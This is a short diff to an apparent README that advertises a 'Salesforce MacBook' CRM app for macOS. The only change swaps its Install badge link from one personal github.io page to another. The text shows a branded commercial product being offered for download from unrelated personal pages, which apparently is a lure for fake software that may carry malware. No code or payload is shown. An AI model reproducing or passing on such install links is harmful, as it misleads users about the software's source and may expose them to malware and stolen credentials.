@@ -3,7 +3,7 @@
 
 Salesforce MacBook is a customer relationship management (CRM) app for macOS. Manage sales, customer data, analytics, and team collaboration in one place. 📊🤝
 
-[![📊 Install Salesforce MacBook](https://img.shields.io/badge/Install%20Salesforce%20MacBook-0d47a1?style=for-the-badge&logo=apple&logoColor=white)](https://elknysson2004.github.io/.github/salesforce-macbook)
+[![📊 Install Salesforce MacBook](https://img.shields.io/badge/Install%20Salesforce%20MacBook-0d47a1?style=for-the-badge&logo=apple&logoColor=white)](https://icepower2001-bit.github.io/.github/salesforce-macbook)
 
 ---
 
